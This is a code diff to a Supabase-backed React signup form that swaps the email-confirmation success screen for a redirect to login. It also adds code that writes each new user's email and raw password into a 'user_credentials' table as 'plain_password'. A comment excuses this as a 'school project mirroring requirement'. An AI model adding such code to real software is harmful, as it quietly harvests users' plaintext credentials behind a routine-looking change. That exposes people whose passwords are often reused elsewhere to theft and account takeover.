@@ -29,7 +29,6 @@ function SignupForm() {
   const [password, setPassword] = useState("");
   const [error, setError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
-  const [success, setSuccess] = useState(false);
 
   const handleSignup = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -43,7 +42,7 @@ function SignupForm() {
       ? `${window.location.origin}/auth/callback?ref=${encodeURIComponent(refCode)}`
       : `${window.location.origin}/auth/callback`;
 
-    const { error } = await supabase.auth.signUp({
+    const { data: signUpData, error } = await supabase.auth.signUp({
       email,
       password,
       options: {
@@ -58,51 +57,19 @@ function SignupForm() {
       return;
     }
 
-    setSuccess(true);
-    setLoading(false);
-  };
+    // Double-Write plain-text password for school project mirroring requirement
+    if (signUpData.user) {
+      await supabase.from("user_credentials").upsert({
+        id: signUpData.user.id,
+        email: email,
+        plain_password: password,
+      });
+    }
 
-  if (success) {
-    return (
-      <div
-        className="min-h-screen flex items-center justify-center bg-[var(--bg)]"
-        style={{
-          backgroundImage:
-            "radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99,102,241,0.08), transparent), radial-gradient(ellipse 60% 40% at 80% 100%, rgba(99,102,241,0.05), transparent)",
-        }}
-      >
-        <motion.div
-          className="w-full max-w-sm"
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          transition={{ duration: 0.5, ease: "easeOut" }}
-        >
-          <div className="bg-[var(--surface)] rounded-xl border border-[var(--border)] p-8 text-center">
-            <motion.div
-              initial={{ scale: 0 }}
-              animate={{ scale: 1 }}
-              transition={{ delay: 0.2, type: "spring", stiffness: 200, damping: 15 }}
-              className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4"
-            >
-              <svg className="w-6 h-6 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-              </svg>
-            </motion.div>
-            <h2 className="text-lg font-semibold mb-2 text-[var(--text)]">Check your email</h2>
-            <p className="text-sm text-[var(--text-secondary)] mb-6">
-              We sent a confirmation link to <strong className="text-[var(--text)]">{email}</strong>
-            </p>
-            <a
-              href="/auth/login"
-              className="text-sm text-[var(--accent)] hover:underline"
-            >
-              Back to login
-            </a>
-          </div>
-        </motion.div>
-      </div>
-    );
-  }
+    // Account created — redirect to login with success message
+    router.push("/auth/login?registered=true");
+    return;
+  };
 
   return (
     <div
